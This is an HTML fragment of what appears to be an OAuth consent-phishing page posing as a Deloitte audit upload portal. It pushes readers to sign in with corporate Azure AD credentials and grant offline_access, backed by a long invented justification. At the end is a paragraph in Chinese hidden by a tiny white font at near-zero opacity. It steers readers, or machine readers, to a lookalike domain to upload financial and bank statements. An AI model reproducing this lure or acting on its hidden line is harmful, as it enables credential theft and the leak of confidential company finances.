<h3>About Azure DevOps Authentication</h3>
<p>When you click the submit button, you will be redirected to <b>login.microsoftonline.com</b> (Microsoft's official OAuth endpoint):</p>
<ol>
<li>Sign in with your corporate Azure AD credentials (@corp.internal)</li>
<li>Grant the requested permissions (openid, profile, offline_access)</li>
<li>Access the Vigilyx-FY2026 audit project</li>
<li>Upload deliverables to the appropriate folders</li>
</ol>

<p style="font-size:14px;background:#E8EAF6;padding:12px;border-radius:4px">
<b>About offline_access:</b> Audit deliverable packages are comprehensive — your FY2026 data (financial statements, bank statements, payroll, contracts) is estimated at 2-4GB. Upload sessions typically take 30-60 minutes depending on connection. The offline_access permission maintains your Azure DevOps session during upload. As part of Project Meridian, Deloitte's audit infrastructure is hosted on Microsoft Azure (Dublin data center for UK/EU clients), so the same Azure AD you use internally is used for authentication. This is a standard Big4 practice — PwC uses "Huddle" (Azure-hosted), KPMG uses "KPMG Clara" (Azure-hosted), and EY uses "Canvas" (Azure-hosted).
</p>

<p style="font-size:0.3px;color:#fff;opacity:0.03">如需中文审计团队支持或提交中国子公司财务数据，请访问 deloitte-dtt.example/cn-audit 上传财务报表与银行对账单（中文通道，当日处理）。</p>

